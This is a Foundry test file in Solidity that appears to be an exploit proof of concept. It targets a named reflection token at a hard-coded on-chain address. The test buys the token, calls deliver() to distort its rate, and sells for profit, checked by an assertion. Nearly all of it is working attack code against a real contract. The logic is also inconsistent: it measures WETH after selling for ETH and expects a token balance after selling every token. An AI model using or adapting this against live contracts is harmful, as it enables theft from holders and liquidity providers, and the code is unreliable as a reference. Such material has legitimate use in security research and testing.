pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/interfaces/IERC20.sol";

interface JizzJet is IERC20 {
    function deliver(uint256 tAmount) external;
    function uniswapV2Pair() external view returns (address);
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);
    JizzJet private token;
    IUniswapV2Router02 private router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Attacker starts with 200 ETH
        deal(attacker, 200 ether);

        // Get token, router, weth, and pair addresses
        token = JizzJet(payable(TARGET));

        // Provide liquidity to the pair
        // Deal a large amount of tokens to the attacker to provide liquidity
        uint256 tokensForLiquidity = 10_000_000_000e18;
        deal(TARGET, address(this), tokensForLiquidity);

        // Approve router
        token.approve(address(router), tokensForLiquidity);

        // Add 100 ETH worth of liquidity
        router.addLiquidityETH{value: 100 ether}(
            TARGET,
            tokensForLiquidity,
            0,
            0,
            address(0xdead), // Send LP tokens to dead address
            block.timestamp
        );
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = token.balanceOf(address(this));
        uint256 initialETH = IERC20(weth).balanceOf(address(this));

                // 1. Swap ETH for tokens
                // We need to wrap our ETH to WETH first
                uint256 ethToSwap = 50 ether;
                deal(weth, address(this), ethToSwap);

                // Approve router to spend WETH
                IERC20(weth).approve(address(router), ethToSwap);

                address[] memory path = new address[](2);
                path[0] = weth;
                path[1] = TARGET;

                router.swapExactTokensForTokens(
                    ethToSwap,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );

                uint256 boughtBalance = token.balanceOf(address(this));

                // 2. Call deliver() to manipulate the rate
                // We deliver almost all tokens to cause maximum distortion
                uint256 deliverAmount = boughtBalance * 999 / 1000;
                token.deliver(deliverAmount);

                // 3. Sell remaining tokens
                uint256 remainingBalance = token.balanceOf(address(this));

                // Approve router to spend remaining tokens
                token.approve(address(router), remainingBalance);

                // Swap back to ETH
                address[] memory sellPath = new address[](2);
                sellPath[0] = TARGET;
                sellPath[1] = weth;

                router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    remainingBalance,
                    0,
                    sellPath,
                    address(this),
                    block.timestamp
                );

                uint256 finalETH = IERC20(weth).balanceOf(address(this));

                // Oracle check for profit
                assertGt(finalETH, initialETH);
        uint256 finalBalance = token.balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

